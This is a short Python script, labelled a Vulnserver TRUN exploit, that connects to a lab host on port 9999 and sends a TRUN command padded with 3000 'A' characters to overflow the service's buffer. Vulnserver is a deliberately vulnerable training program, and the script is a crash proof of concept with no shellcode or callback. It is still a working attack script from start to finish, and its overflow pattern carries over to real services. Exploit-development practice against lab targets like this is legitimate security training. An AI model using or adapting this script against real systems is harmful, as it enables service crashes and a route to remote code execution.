#!/usr/bin/env python

from socket import socket, AF_INET, SOCK_STREAM
from sys import exit

rhost = "192.168.41.128"
rport = 9999
target = (rhost, rport)


def banner(rhost, rport):
    print("""==================================================================
Vulnserver TRUN Exploit
By: Kevin Kirsche (d3c3pt10n)
==================================================================
RHOST: {rhost} | RPORT: {rport}
        """.format(rhost=rhost, rport=rport))


def info(msg):
    print('[*] {msg}'.format(msg=msg))


def error(msg):
    print('[!] {msg}'.format(msg=msg))


def received(msg):
    print('[+] Received:\n\t{msg}'.format(msg=msg))


def poc_payload():
    payload = "TRUN /.:/"
    payload += "A"*3000
    payload += "\r\n"
    return payload


if __name__ == '__main__':
    banner(rhost, rport)
    payload = poc_payload()

    s = socket(AF_INET, SOCK_STREAM)
    info('Connecting to target')
    try:
        s.connect(target)
    except Exception:
        error('Failed to connect to target!')
        exit(1)

    try:
        welcome = s.recv(1024)
        received(welcome)
    except Exception:
        error('Failed to receive welcome message from vulnserver!')
        exit(1)

    info('Sending payload')
    s.send(payload)
